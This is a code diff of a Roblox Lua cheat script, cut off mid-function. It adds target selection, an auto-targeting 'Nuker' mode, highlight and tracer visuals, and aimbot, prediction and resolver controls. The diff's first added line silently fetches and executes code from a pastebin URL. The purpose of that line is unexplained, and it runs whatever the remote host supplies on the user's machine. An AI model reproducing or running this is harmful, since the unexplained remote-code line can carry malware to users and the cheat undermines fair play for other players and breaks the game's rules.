@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/gimbTwW1"))()
 local library, dim2, hex, rgbseq, rgbkey, themes, flags, random, lp = loadstring(game:HttpGet("https://raw.githubusercontent.com/AreWeDeadas/Rebuild.gg/refs/heads/main/radar"))()
 
 -- apply default theme before creating UI
@@ -39,64 +40,1246 @@ local custom_hud = library:custom_hud({
 })
 --
 
+-- cached services and common objects
+local vars = {
+	ps = game:GetService("Players"),
+	rs = game:GetService("RunService"),
+	uis = game:GetService("UserInputService"),
+	ts = game:GetService("TweenService"),
+	hs = game:GetService("HttpService"),
+	cam = workspace.CurrentCamera,
+	math = math,
+	cf = CFrame,
+	v2 = Vector2,
+	v3 = Vector3,
+}
+
+-- utility system start
+local utility = {}
+do
+	-- validate player has alive character
+	function utility:ValidateClient(player)
+		if not player then return false end
+		local char = player.Character
+		if not char then return false end
+		local hum = char:FindFirstChildOfClass("Humanoid")
+		if not hum or hum.Health <= 0 then return false end
+		return true
+	end
+
+	-- preferred body part for targeting
+	function utility:GetPreferredPart(char)
+		return char and (
+			char:FindFirstChild("HumanoidRootPart")
+			or char:FindFirstChild("Head")
+			or char:FindFirstChild("UpperTorso")
+			or char:FindFirstChild("Torso")
+		) or nil
+	end
+
+	-- world position to screen point
+	function utility:ToScreen(pos)
+		local v3p, on = vars.cam:WorldToViewportPoint(pos)
+		return vars.v2.new(v3p.X, v3p.Y), on
+	end
+
+	-- mouse helpers
+	function utility:GetMouseLocation()
+		return vars.uis:GetMouseLocation()
+	end
+	function utility:GetMouseDistance(screenPoint)
+		return (self:GetMouseLocation() - screenPoint).Magnitude
+	end
+
+	-- get closest player to mouse on screen
+	function utility:GetClosestToMouse()
+		local best, bestd = nil, nil
+		for _, plr in ipairs(vars.ps:GetPlayers()) do
+			if plr ~= lp and self:ValidateClient(plr) then
+				local char = plr.Character
+				local part = self:GetPreferredPart(char)
+				if part then
+					local sp, on = self:ToScreen(part.Position)
+					if on then
+						local d = self:GetMouseDistance(sp)
+						if not bestd or d < bestd then
+							best, bestd = plr, d
+						end
+					end
+				end
+			end
+		end
+		return best, bestd or vars.math.huge
+	end
+end
+-- utility system end
+
+-- shared targeting state (used by targeting UI and aimbot)
+local targeting_state = { current = nil }
 -- targeting system start
 do
 	-- framework function
 	local framework = {}
-	
-	local current_target = nil
+
+    -- highlight state (for visuals)
+	    -- highlight state (for visuals)
+    local hl_state = { 
+        last_char = nil, 
+        hl = nil, 
+        char_added_conn = nil,
+        char_removing_conn = nil,
+        died_conn = nil, 
+        bound_player = nil,
+        update_counter = 0
+    }
+    local HL_NAME = "RB_HL_32v"
+    
+    -- больше не создаем заранее и не переиспользуем
+    local function get_or_create_highlight()
+        local h = Instance.new("Highlight")
+        h.Name = HL_NAME
+        h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        return h
+    end
+
+    local function clear_highlight()
+        -- ПОЛНАЯ очистка: уничтожаем инстанс и отписываемся от событий
+        if hl_state.hl then
+            pcall(function() hl_state.hl:Destroy() end)
+            hl_state.hl = nil
+        end
+        if hl_state.died_conn then pcall(function() hl_state.died_conn:Disconnect() end) hl_state.died_conn = nil end
+        if hl_state.char_added_conn then pcall(function() hl_state.char_added_conn:Disconnect() end) hl_state.char_added_conn = nil end
+        if hl_state.char_removing_conn then pcall(function() hl_state.char_removing_conn:Disconnect() end) hl_state.char_removing_conn = nil end
+        hl_state.last_char = nil
+        hl_state.bound_player = nil
+    end
+
+    local function clear_highlight_visual()
+        -- ТОЛЬКО визуальная очистка: не уничтожаем, а отключаем singleton
+        if hl_state.hl then
+            hl_state.hl.Enabled = false
+            hl_state.hl.Adornee = nil
+        end
+        hl_state.last_char = nil
+        -- НЕ трогаем char_added_conn/char_removing_conn/died_conn здесь
+    end
+
+	    -- utility getters for flags
+    local function get_cp_color(flag, default)
+        local v = flags and flags[flag]
+        if v == nil then return default end
+        local t = typeof(v)
+        if t == "table" and v.Color then return v.Color end
+        if t == "Color3" then return v end
+        return default
+    end
+
+    local function get_num(flag, default)
+        local v = flags and flags[flag]
+        if typeof(v) == "number" then return v end
+        return default
+    end
+
+    local function apply_highlight(char)
+        -- выключаем визуал, если настроек нет или цель отсутствует
+        if not char or not flags or not flags["target_highlight"] then
+            clear_highlight_visual()
+            return
+        end
+
+        -- создаем singleton один раз
+        if not hl_state.hl then
+            hl_state.hl = get_or_create_highlight()
+        end
+
+        -- обновляем свойства и привязку
+        local h = hl_state.hl
+        h.FillColor = get_cp_color("th_fill", Color3.fromRGB(255, 255, 0))
+        h.OutlineColor = get_cp_color("th_out", Color3.fromRGB(0, 0, 0))
+        h.FillTransparency = get_num("th_ftrs", 0.5)
+        h.OutlineTransparency = get_num("th_otrs", 0.5)
+        if h.Adornee ~= char then
+            h.Adornee = char
+        end
+        if h.Parent ~= char then
+            h.Parent = char -- привязываем к модели персонажа
+        end
+        h.Enabled = true
+
+        hl_state.last_char = char
+    end
+
+    local function bind_humanoid_died(char)
+        if not char then return end
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            if hl_state.died_conn then pcall(function() hl_state.died_conn:Disconnect() end) end
+            hl_state.died_conn = hum.Died:Connect(function()
+                -- цель умерла: убираем только визуал, оставляем подписки для авто-реапплая
+                print("[TH] Humanoid died for:", char.Name, "- removing visual highlight")
+                clear_highlight_visual()
+            end)
+        end
+    end
+
+    -- utility: disable highlight (не удаляем, только отключаем)
+    local function remove_all_highlights(char)
+        if not char then return end
+        print("[TH] Cleanup highlights for:", char.Name)
+        if hl_state.hl then
+            hl_state.hl.Enabled = false
+            hl_state.hl.Adornee = nil
+        end
+        -- очищаем другие highlight если есть
+        for _, obj in ipairs(char:GetDescendants()) do
+            if typeof(obj) == "Instance" and obj:IsA("Highlight") and obj ~= hl_state.hl then
+                pcall(function() obj:Destroy() end)
+            end
+        end
+    end
+
+    local function setup_target_highlight_bindings(player)
+        if not player then return end
+        
+        -- отключаем старые подключения
+        if hl_state.char_added_conn then 
+            pcall(function() hl_state.char_added_conn:Disconnect() end) 
+        end
+        if hl_state.char_removing_conn then 
+            pcall(function() hl_state.char_removing_conn:Disconnect() end) 
+        end
+        
+        hl_state.bound_player = player
+        
+        -- обработчик удаления персонажа
+        hl_state.char_removing_conn = player.CharacterRemoving:Connect(function()
+            print("[TH] CharacterRemoving for:", player.Name)
+            -- только визуальная очистка, сохраняем подписки
+            clear_highlight_visual()
+        end)
+        
+        -- обработчик добавления персонажа (как в scripttoskid)
+        hl_state.char_added_conn = player.CharacterAdded:Connect(function(newChar)
+            if not newChar then return end
+            print("[TH] CharacterAdded for:", player.Name)
+            -- ждем загрузки персонажа
+            game:GetService("RunService").Heartbeat:Wait()
+            
+            -- проверяем что этот игрок все еще является текущей целью
+            local is_current_target = targeting_state and targeting_state.current and 
+                (targeting_state.current == player or 
+                 (targeting_state.current.UserId and targeting_state.current.UserId == player.UserId))
+            
+            if is_current_target and flags and flags["target_highlight"] then
+                print("[TH] Reapplying highlight after respawn for:", player.Name)
+                apply_highlight(newChar)
+                bind_humanoid_died(newChar)
+            end
+        end)
+        
+        -- применяем к текущему персонажу если существует
+        if player.Character then
+            apply_highlight(player.Character)
+            bind_humanoid_died(player.Character)
+        end
+    end
+    
+    -- простое обновление: при смене цели пересоздаем highlight
+    function framework:update_target_highlight()
+        -- выключено в UI -> очищаем и выходим
+        if not flags or not flags["target_highlight"] then
+            clear_highlight()
+            return
+        end
+
+        local current = targeting_state and targeting_state.current
+        local char = current and current.Character
+        if not char then
+            clear_highlight()
+            return
+        end
+
+        -- при смене цели пересоздаем
+        if hl_state.last_char ~= char then
+            apply_highlight(char)
+            bind_humanoid_died(char)
+        end
+    end
+
+	-- use shared state instead of a private upvalue
+	-- current target is stored in `targeting_state.current`
 	
 	function framework:selectTarget() 
-		print("[Targeting] selectTarget called")
-		
-		if current_target then
-			-- Release current target
-			print("[Targeting] Releasing target: " .. current_target.Name)
-			current_target = nil
-			print("[Targeting] Target cleared")
+		if flags and flags["Debug"] then print("[Targeting] selectTarget called") end
+
+		if targeting_state.current then
+			if flags and flags["Debug"] then print("[Targeting] Releasing target:", targeting_state.current.Name) end
+			clear_highlight()
+			targeting_state.current = nil
+			if flags and flags["Debug"] then print("[Targeting] Target cleared") end
 		else
-			-- Acquire new target
-			print("[Targeting] Acquiring target...")
-			local closest_player = nil
-			local closest_distance = math.huge
-			
-			for _, player in pairs(game.Players:GetPlayers()) do
-				if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-					local distance = (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
-					if distance < closest_distance then
-						closest_distance = distance
-						closest_player = player
-					end
+			-- Acquire new target via utility
+			local best_player, best_dist = utility:GetClosestToMouse()
+			if best_player then
+				targeting_state.current = best_player
+				if flags and flags["target_highlight"] then
+					setup_target_highlight_bindings(best_player)
 				end
-			end
-			
-			if closest_player then
-				current_target = closest_player
-				print("[Targeting] Target acquired: " .. current_target.Name .. " (Distance: " .. math.floor(closest_distance) .. ")")
+				if flags and flags["Debug"] then
+					print("[Targeting] Target acquired:", targeting_state.current.Name, "(MouseDist:", vars.math.floor(best_dist), ")")
+				end
 			else
-				print("[Targeting] No target found")
+				if flags and flags["Debug"] then print("[Targeting] No target found") end
 			end
 		end
 	end
 	
 	-- ui elements
 	local rage_col = Aimbot:column()
-	local targeting_sec = rage_col:section({ name = "targeting" })
+	local TargetSec, VisSec = rage_col:multi_section({ names = { "Targeting", "Visuals" } })
 	
-	local targeting_toggle = targeting_sec:toggle({
+	local targeting_toggle = TargetSec:toggle({
 		name = "Enabled",
 		flag = "Targeting_Enabled",
 		default = false,
 	}):keybind({
-		name = "Target Select",
+		name = "Target",
 		flag = "Target_Select_Bind",
 		default = "t",
 		callback = function()
 			framework:selectTarget()
 		end,
 	})
+
+  -- targeting mode dropdown (Sticky/Nuker)
+  local targeting_mode = TargetSec:dropdown({
+      name = "Mode",
+      flag = "Targeting_Mode",
+      items = { "Sticky", "Nuker" },
+      default = "Sticky",
+  })
+
+    local function refresh_hl_from_ui()
+        if not flags or not flags["target_highlight"] then return end
+        local char = hl_state and hl_state.last_char
+        if (not char) and targeting_state and targeting_state.current then
+            char = targeting_state.current.Character
+            -- обновляем last_char если получили новый персонаж
+            if char then
+                hl_state.last_char = char
+            end
+        end
+        if char then 
+            apply_highlight(char) 
+            bind_humanoid_died(char)
+        end
+    end
+
+    local th_toggle = VisSec:toggle({
+        name = "TargetHighlight",
+        flag = "target_highlight",
+        default = false,
+        callback = function(state)
+            if state then
+                refresh_hl_from_ui()
+            else
+                clear_highlight()
+            end
+        end
+    })
+    -- colorpickers привязаны к toggle (видны только при включенном TargetHighlight)
+    th_toggle:colorpicker({ name = "Fill", flag = "th_fill", default = Color3.fromRGB(255, 255, 0), callback = function()
+        refresh_hl_from_ui()
+    end })
+    th_toggle:colorpicker({ name = "Out",  flag = "th_out",  default = Color3.fromRGB(0, 0, 0), callback = function()
+        refresh_hl_from_ui()
+    end })
+	-- dependent transparency sliders (interval 0.01)
+	local th_dep = VisSec:dependency_box()
+	th_dep:setup_dependencies({ { th_toggle, true } })
+	th_dep:slider({ name = "FTrs", flag = "th_ftrs", min = 0, max = 1, default = 0.5, interval = 0.01, callback = function()
+        refresh_hl_from_ui()
+    end })
+    th_dep:slider({ name = "OTrs", flag = "th_otrs", min = 0, max = 1, default = 0.5, interval = 0.01, callback = function()
+        refresh_hl_from_ui()
+    end })
+
+    -- TargetTracer system
+    do
+        local tracer_state = {
+            enabled = false,
+            body_part = "HumanoidRootPart",
+            origin = "mouse",
+            line = nil,
+            outline = nil,
+            connection = nil,
+            line_thickness = 2,
+            outline_thickness = 4,
+            line_color = Color3.fromRGB(255, 255, 255),
+            outline_color = Color3.fromRGB(0, 0, 0),
+            -- 3D style removed
+        }
+        
+        local function cleanup_tracer()
+            if tracer_state.line then
+                pcall(function() tracer_state.line:Remove() end)
+                tracer_state.line = nil
+            end
+            if tracer_state.outline then
+                pcall(function() tracer_state.outline:Remove() end)
+                tracer_state.outline = nil
+            end
+            -- 3D cleanup
+            if tracer_state.beam_line then pcall(function() tracer_state.beam_line:Destroy() end) tracer_state.beam_line = nil end
+            if tracer_state.beam_outline then pcall(function() tracer_state.beam_outline:Destroy() end) tracer_state.beam_outline = nil end
+            if tracer_state.attach_a then pcall(function() tracer_state.attach_a:Destroy() end) tracer_state.attach_a = nil end
+            if tracer_state.attach_b then pcall(function() tracer_state.attach_b:Destroy() end) tracer_state.attach_b = nil end
+            if tracer_state.start_part then pcall(function() tracer_state.start_part:Destroy() end) tracer_state.start_part = nil end
+            if tracer_state.end_part then pcall(function() tracer_state.end_part:Destroy() end) tracer_state.end_part = nil end
+            if tracer_state.connection then
+                tracer_state.connection:Disconnect()
+                tracer_state.connection = nil
+            end
+        end
+
+        local function ensure_3d()
+            if tracer_state.start_part and tracer_state.end_part and tracer_state.beam_line and tracer_state.beam_outline then
+                return
+            end
+            -- create holder parts
+            local sp = Instance.new("Part")
+            sp.Anchored = true
+            sp.CanCollide = false
+            sp.CanQuery = false
+            sp.Size = Vector3.new(0.2, 0.2, 0.2)
+            sp.Transparency = 1
+            sp.Name = "TT_Start"
+            sp.Parent = workspace
+            tracer_state.start_part = sp
+
+            local ep = Instance.new("Part")
+            ep.Anchored = true
+            ep.CanCollide = false
+            ep.CanQuery = false
+            ep.Size = Vector3.new(0.2, 0.2, 0.2)
+            ep.Transparency = 1
+            ep.Name = "TT_End"
+            ep.Parent = workspace
+            tracer_state.end_part = ep
+
+            local a0 = Instance.new("Attachment")
+            a0.Parent = sp
+            tracer_state.attach_a = a0
+
+            local a1 = Instance.new("Attachment")
+            a1.Parent = ep
+            tracer_state.attach_b = a1
+
+            -- outline beam first (wider, black by default)
+            local bout = Instance.new("Beam")
+            bout.Attachment0 = a0
+            bout.Attachment1 = a1
+            bout.FaceCamera = true
+            bout.Color = ColorSequence.new(tracer_state.outline_color)
+            bout.Width0 = 0.3
+            bout.Width1 = 0.3
+            bout.ZOffset = 0.02
+            bout.Transparency = NumberSequence.new(0)
+            bout.Enabled = false
+            bout.Parent = workspace
+            tracer_state.beam_outline = bout
+
+            -- main beam (narrower, on top)
+            local bline = Instance.new("Beam")
+            bline.Attachment0 = a0
+            bline.Attachment1 = a1
+            bline.FaceCamera = true
+            bline.Color = ColorSequence.new(tracer_state.line_color)
+            bline.Width0 = 0.15
+            bline.Width1 = 0.15
+            bline.ZOffset = 0
+            bline.Transparency = NumberSequence.new(0)
+            bline.Enabled = false
+            bline.Parent = workspace
+            tracer_state.beam_line = bline
+        end
+        
+        local function create_tracer()
+            if not tracer_state.enabled then
+                cleanup_tracer()
+                return
+            end
+            
+            -- 3D style removed
+
+            if not tracer_state.outline then
+                tracer_state.outline = Drawing.new("Line")
+                tracer_state.outline.Visible = false
+                tracer_state.outline.Color = tracer_state.outline_color
+                tracer_state.outline.Thickness = tracer_state.outline_thickness
+            end
+            
+            if not tracer_state.line then
+                tracer_state.line = Drawing.new("Line")
+                tracer_state.line.Visible = false
+                tracer_state.line.Color = tracer_state.line_color
+                tracer_state.line.Thickness = tracer_state.line_thickness
+            end
+            
+            if not tracer_state.connection then
+                local RS = (vars and vars.rs) or game:GetService("RunService")
+                local UIS = (vars and vars.uis) or game:GetService("UserInputService")
+                local Camera = (workspace and workspace.CurrentCamera) or game:GetService("Workspace").CurrentCamera
+                
+                tracer_state.connection = RS.RenderStepped:Connect(function()
+                    if not tracer_state.enabled or not targeting_state.current then
+                        if tracer_state.line then tracer_state.line.Visible = false end
+                        if tracer_state.outline then tracer_state.outline.Visible = false end
+                        if tracer_state.beam_line then tracer_state.beam_line.Enabled = false end
+                        if tracer_state.beam_outline then tracer_state.beam_outline.Enabled = false end
+                        return
+                    end
+                    
+                    local target = targeting_state.current
+                    local char = target and target.Character
+                    if not char then
+                        if tracer_state.line then tracer_state.line.Visible = false end
+                        if tracer_state.outline then tracer_state.outline.Visible = false end
+                        return
+                    end
+                    
+                    local part = char:FindFirstChild(tracer_state.body_part)
+                    if not part then
+                        if tracer_state.line then tracer_state.line.Visible = false end
+                        if tracer_state.outline then tracer_state.outline.Visible = false end
+                        return
+                    end
+                    
+                    -- 3D style removed
+
+                    local screen_pos, on_screen = Camera:WorldToViewportPoint(part.Position)
+                    if not on_screen then
+                        if tracer_state.line then tracer_state.line.Visible = false end
+                        if tracer_state.outline then tracer_state.outline.Visible = false end
+                        -- also hide 3D if exists
+                        if tracer_state.beam_line then tracer_state.beam_line.Enabled = false end
+                        if tracer_state.beam_outline then tracer_state.beam_outline.Enabled = false end
+                        return
+                    end
+                    
+                    local end_pos = Vector2.new(screen_pos.X, screen_pos.Y)
+                    local start_pos
+                    
+                    if tracer_state.origin == "mouse" then
+                        start_pos = UIS:GetMouseLocation()
+                    elseif tracer_state.origin == "top" then
+                        start_pos = Vector2.new(Camera.ViewportSize.X / 2, 0)
+                    elseif tracer_state.origin == "bottom" then
+                        start_pos = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
+                    elseif tracer_state.origin == "center" then
+                        start_pos = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+                    end
+                    
+                    if tracer_state.outline then
+                        tracer_state.outline.From = start_pos
+                        tracer_state.outline.To = end_pos
+                        tracer_state.outline.Visible = true
+                        tracer_state.outline.Thickness = tracer_state.outline_thickness
+                    end
+                    
+                    if tracer_state.line then
+                        tracer_state.line.From = start_pos
+                        tracer_state.line.To = end_pos
+                        tracer_state.line.Visible = true
+                        tracer_state.line.Thickness = tracer_state.line_thickness
+                        tracer_state.line.Color = tracer_state.line_color
+                    end
+                end)
+            end
+        end
+        
+        -- UI elements
+        local tt_toggle = VisSec:toggle({
+            name = "TargetTracer",
+            flag = "target_tracer",
+            default = false,
+            callback = function(state)
+                tracer_state.enabled = state
+                if state then
+                    create_tracer()
+                else
+                    cleanup_tracer()
+                end
+            end
+        })
+        
+        -- colorpickers attached to toggle (CustomUI style)
+        tt_toggle:colorpicker({
+            name = "Out",
+            flag = "tt_out",
+            default = Color3.fromRGB(0, 0, 0),
+            callback = function(color)
+                tracer_state.outline_color = color
+                if tracer_state.outline then
+                    tracer_state.outline.Color = color
+                end
+            end
+        })
+        tt_toggle:colorpicker({
+            name = "Fill",
+            flag = "tt_fill",
+            default = Color3.fromRGB(255, 255, 255),
+            callback = function(color)
+                tracer_state.line_color = color
+                if tracer_state.line then
+                    tracer_state.line.Color = color
+                end
+            end
+        })
+
+        -- dependency box для остальных настроек
+        local tt_dep = VisSec:dependency_box()
+        tt_dep:setup_dependencies({ { tt_toggle, true } })
+        
+        -- dropdowns
+        tt_dep:dropdown({
+            name = "Part",
+            flag = "tt_part",
+            items = {
+                "HumanoidRootPart", "Head", "UpperTorso", "LowerTorso",
+                "LeftUpperArm", "LeftLowerArm", "LeftHand",
+                "RightUpperArm", "RightLowerArm", "RightHand",
+                "LeftUpperLeg", "LeftLowerLeg", "LeftFoot",
+                "RightUpperLeg", "RightLowerLeg", "RightFoot"
+            },
+            default = "HumanoidRootPart",
+            callback = function(value)
+                tracer_state.body_part = value
+            end
+        })
+        
+        tt_dep:dropdown({
+            name = "Origin",
+            flag = "tt_origin",
+            items = { "mouse", "top", "bottom", "center" },
+            default = "mouse",
+            callback = function(value)
+                tracer_state.origin = value
+            end
+        })
+        
+        -- Style dropdown removed (3D removed)
+        
+        -- cleanup on unload
+        table.insert(library.connections, {
+            Disconnect = function()
+                cleanup_tracer()
+            end
+        })
+    end
+
+  -- nuker runtime: continuously picks closest to mouse, no FOV, no keybind
+  do
+      local RunService = game:GetService("RunService")
+      local Players = game:GetService("Players")
+      local LocalPlayer = Players.LocalPlayer
+      local Camera = workspace.CurrentCamera
+      local UIS = game:GetService("UserInputService")
+
+      local function get_preferred_part(char)
+          return char and (char:FindFirstChild("HumanoidRootPart")
+              or char:FindFirstChild("Head")
+              or char:FindFirstChild("UpperTorso")
+              or char:FindFirstChild("Torso"))
+      end
+
+      local conn = RunService.RenderStepped:Connect(function()
+          if not flags then return end
+          if not flags["Targeting_Enabled"] then return end
+          if flags["Targeting_Mode"] ~= "Nuker" then return end
+
+          local mouse = UIS:GetMouseLocation()
+          local best_player, best_dist
+          best_dist = math.huge
+
+          for _, plr in ipairs(Players:GetPlayers()) do
+              if plr ~= LocalPlayer then
+                  local char = plr.Character
+                  local part = get_preferred_part(char)
+                  if part then
+                      local screen, on_screen = Camera:WorldToViewportPoint(part.Position)
+                      if on_screen then
+                          local d = (mouse - Vector2.new(screen.X, screen.Y)).Magnitude
+                          if d < best_dist then
+                              best_dist = d
+                              best_player = plr
+                          end
+                      end
+                  end
+              end
+          end
+
+          targeting_state.current = best_player
+          -- visuals sync for Nuker (только при смене персонажа)
+          if best_player then
+              if flags and flags["target_highlight"] then
+                  local char = best_player.Character
+                  if char and (hl_state.last_char ~= char) then
+                      apply_highlight(char)
+                  end
+              end
+          else
+              -- no target -> clear highlight если был активен
+              if hl_state and hl_state.hl then
+                  clear_highlight()
+              end
+          end
+      end)
+      table.insert(library.connections, conn)
+  end
 end
 -- targeting system end
+
+-- aimbot/prediction/resolver UI start
+do
+    -- create multi-section directly under Rage tab (not a column)
+    local AimSec, PredSec, ResSec = Aimbot:multi_section({ names = { "Aimbot", "Prediction", "Resolver" } })
+
+    -- Aimbot section
+    local aimbot_toggle = AimSec:toggle({
+        name = "Enabled",
+        flag = "aimbot_enabled",
+        default = false,
+    })
+    local aimbot_dep = AimSec:dependency_box()
+    aimbot_dep:setup_dependencies({ { aimbot_toggle, true } })
+    aimbot_dep:dropdown({
+        name = "Part",
+        flag = "aimbot_part",
+        items = {
+            "HumanoidRootPart","Head","UpperTorso","LowerTorso",
+            "LeftUpperArm","LeftLowerArm","LeftHand","RightUpperArm","RightLowerArm","RightHand",
+            "LeftUpperLeg","LeftLowerLeg","LeftFoot","RightUpperLeg","RightLowerLeg","RightFoot"
+        },
+        default = "HumanoidRootPart",
+    })
+
+    -- Prediction section
+    local pred_toggle = PredSec:toggle({
+        name = "Enabled",
+        flag = "pred_enabled",
+        default = false,
+    })
+    local pred_dep = PredSec:dependency_box()
+    pred_dep:setup_dependencies({ { pred_toggle, true } })
+    local mode_dd = pred_dep:dropdown({
+        name = "Mode",
+        flag = "pred_mode",
+        items = { "Sets", "Auto" },
+        default = "Sets",
+    })
+    
+    -- XYZ labels and textboxes (visible only in Sets mode)
+    local sets_dep = PredSec:dependency_box()
+    sets_dep:setup_dependencies({ { pred_toggle, true }, { mode_dd, "Sets" } })
+    sets_dep:label({ name = "PredictionX" })
+    sets_dep:textbox({ flag = "pred_x", default = "0" })
+    sets_dep:label({ name = "PredictionY" })
+    sets_dep:textbox({ flag = "pred_y", default = "0" })
+    sets_dep:label({ name = "PredictionZ" })
+    sets_dep:textbox({ flag = "pred_z", default = "0" })
+    
+    -- Show prediction tracer
+    PredSec:toggle({
+        name = "ShowPrediction",
+        flag = "show_prediction",
+        default = false,
+    }):colorpicker({
+        name = "Color",
+        flag = "prediction_color",
+        default = hex("#ffffff"),
+    })
+
+    -- Resolver section
+    local res_toggle = ResSec:toggle({
+        name = "Enabled",
+        flag = "resolver_enabled",
+        default = false,
+    })
+    local res_dep = ResSec:dependency_box()
+    res_dep:setup_dependencies({ { res_toggle, true } })
+    res_dep:dropdown({
+        name = "Mode",
+        flag = "resolver_mode",
+        items = { "Velocity", "Recalculate", "MoveDirection", "LookVector", "CalculateCFrame" },
+        default = "Velocity",
+    })
+end
+-- aimbot/prediction/resolver UI end
+
+-- aimbot runtime start
+do
+    -- preferences
+    local PreferredParts = { "HumanoidRootPart", "Head", "UpperTorso", "Torso" }
+
+    -- ping -> scalar prediction table (Auto mode)
+    local predictionTable = {
+        {20,0.08960952},
+        {21,0.091171428},{22,0.092733336},{23,0.094295244},{24,0.095857152},{25,0.09741906},
+        {26,0.098980968},{27,0.100542876},{28,0.102104784},{29,0.103666692},{30,0.11252476},
+        {31,0.112978758},{32,0.113432756},{33,0.113886754},{34,0.114340752},{35,0.11479475},
+        {36,0.115248748},{37,0.115702746},{38,0.116156744},{39,0.116610742},{40,0.11706474},
+        {41,0.117518738},{42,0.117972736},{43,0.118426734},{44,0.118880732},{45,0.11933473},
+        {46,0.119788728},{47,0.120242726},{48,0.120696724},{49,0.121150722},{50,0.13544},
+        {51,0.1348236},{52,0.1342072},{53,0.1335908},{54,0.1329744},{55,0.132358},
+        {56,0.1317416},{57,0.1311252},{58,0.1305088},{59,0.1298924},{60,0.129276},
+        {61,0.1286596},{62,0.1280432},{63,0.1274268},{64,0.1268104},{65,0.1264236},
+        {66,0.1262627},{67,0.1261018},{68,0.1259409},{69,0.12578},{70,0.12533},
+        {71,0.125474},{72,0.125618},{73,0.125762},{74,0.125906},{75,0.12605},
+        {76,0.126194},{77,0.126338},{78,0.126482},{79,0.126626},{80,0.13934},
+        {81,0.1395937},{82,0.1398474},{83,0.1401011},{84,0.1403548},{85,0.1406085},
+        {86,0.1408622},{87,0.1411159},{88,0.1413696},{89,0.1416233},{90,0.141877},
+        {91,0.1421307},{92,0.1423844},{93,0.1426381},{94,0.1428918},{95,0.1431455},
+        {96,0.1433992},{97,0.1436529},{98,0.1439066},{99,0.1441603},{100,0.141987},
+        {101,0.1423107},{102,0.1426344},{103,0.1429581},{104,0.1432818},{105,0.1436055},
+        {106,0.1439292},{107,0.1442529},{108,0.1445766},{109,0.1449003},{110,0.144634},
+        {111,0.1449577},{112,0.1452814},{113,0.1456051},{114,0.1459288},{115,0.1462525},
+        {116,0.1465762},{117,0.1468999},{118,0.1472236},{119,0.1475473},{120,0.147281},
+        {121,0.1476047},{122,0.1479284},{123,0.1482521},{124,0.1485758},{125,0.1488995},
+        {126,0.1492232},{127,0.1495469},{128,0.1498706},{129,0.1501943},{130,0.149928},
+        {131,0.1502517},{132,0.1505754},{133,0.1508991},{134,0.1512228},{135,0.1515465},
+        {136,0.1518702},{137,0.1521939},{138,0.1525176},{139,0.1528413},{140,0.152575},
+        {141,0.1528987},{142,0.1532224},{143,0.1535461},{144,0.1538698},{145,0.1541935},
+        {146,0.1545172},{147,0.1548409},{148,0.1551646},{149,0.1554883},{150,0.155222},
+        {151,0.1555457},{152,0.1558694},{153,0.1561931},{154,0.1565168},{155,0.1568405},
+        {156,0.1571642},{157,0.1574879},{158,0.1578116},{159,0.1581353},{160,0.157869},
+        {161,0.1581927},{162,0.1585164},{163,0.1588401},{164,0.1591638},{165,0.1594875},
+        {166,0.1598112},{167,0.1601349},{168,0.1604586},{169,0.1607823},{170,0.160516},
+        {171,0.1608397},{172,0.1611634},{173,0.1614871},{174,0.1618108},{175,0.1621345},
+        {176,0.1624582},{177,0.1627819},{178,0.1631056},{179,0.1634293},{180,0.163163},
+        {181,0.1634867},{182,0.1638104},{183,0.1641341},{184,0.1644578},{185,0.1647815},
+        {186,0.1651052},{187,0.1654289},{188,0.1657526},{189,0.1660763},{190,0.16581},
+        {191,0.1661337},{192,0.1664574},{193,0.1667811},{194,0.1671048},{195,0.1674285},
+        {196,0.1677522},{197,0.1680759},{198,0.1683996},{199,0.1687233},{200,0.168457},
+        {201,0.1687807},{202,0.1691044},{203,0.1694281},{204,0.1697518},{205,0.1700755},
+        {206,0.1703992},{207,0.1707229},{208,0.1710466},{209,0.1713703},{210,0.171104},
+        {211,0.1714277},{212,0.1717514},{213,0.1720751},{214,0.1723988},{215,0.1727225},
+        {216,0.1730462},{217,0.1733699},{218,0.1736936},{219,0.1740173},{220,0.173751},
+        {221,0.1740747},{222,0.1743984},{223,0.1747221},{224,0.1750458},{225,0.1753695},
+        {226,0.1756932},{227,0.1760169},{228,0.1763406},{229,0.1766643},{230,0.176398},
+        {231,0.1767217},{232,0.1770454},{233,0.1773691},{234,0.1776928},{235,0.1780165},
+        {236,0.1783402},{237,0.1786639},{238,0.1789876},{239,0.1793113},{240,0.179045},
+        {241,0.1793687},{242,0.1796924},{243,0.1800161},{244,0.1803398},{245,0.1806635},
+        {246,0.1809872},{247,0.1813109},{248,0.1816346},{249,0.1819583},{250,0.181692},
+        {251,0.1820157},{252,0.1823394},{253,0.1826631},{254,0.1829868},{255,0.1833105},
+        {256,0.1836342},{257,0.1839579},{258,0.1842816},{259,0.1846053},{260,0.184339},
+        {261,0.1846627},{262,0.1849864},{263,0.1853101},{264,0.1856338},{265,0.1859575},
+        {266,0.1862812},{267,0.1866049},{268,0.1869286},{269,0.1872523},{270,0.186986},
+        {271,0.1873097},{272,0.1876334},{273,0.1879571},{274,0.1882808},{275,0.1886045},
+        {276,0.1889282},{277,0.1892519},{278,0.1895756},{279,0.1898993},{280,0.189633},
+        {281,0.1899567},{282,0.1902804},{283,0.1906041},{284,0.1909278},{285,0.1912515},
+        {286,0.1915752},{287,0.1918989},{288,0.1922226},{289,0.1925463},{290,0.19228},
+        {291,0.1926037},{292,0.1929274},{293,0.1932511},{294,0.1935748},{295,0.1938985},
+        {296,0.1942222},{297,0.1945459},{298,0.1948696},{299,0.1951933},{300,0.194927}
+    }
+
+    local function get_auto_scalar()
+        local stats = game:GetService("Stats")
+        local pingMs
+        local ok, _ = pcall(function()
+            local s = stats.Network.ServerStatsItem["Data Ping"]:GetValueString() -- e.g. "45 ms"
+            pingMs = tonumber((s or ""):match("%d+"))
+        end)
+        if not ok or not pingMs then return 0 end
+        local bestVal, bestDiff
+        for _, pair in ipairs(predictionTable) do
+            local diff = math.abs(pingMs - pair[1])
+            if not bestDiff or diff < bestDiff then
+                bestDiff = diff
+                bestVal = pair[2]
+            end
+        end
+        return bestVal or 0
+    end
+
+    local function get_target_part(player)
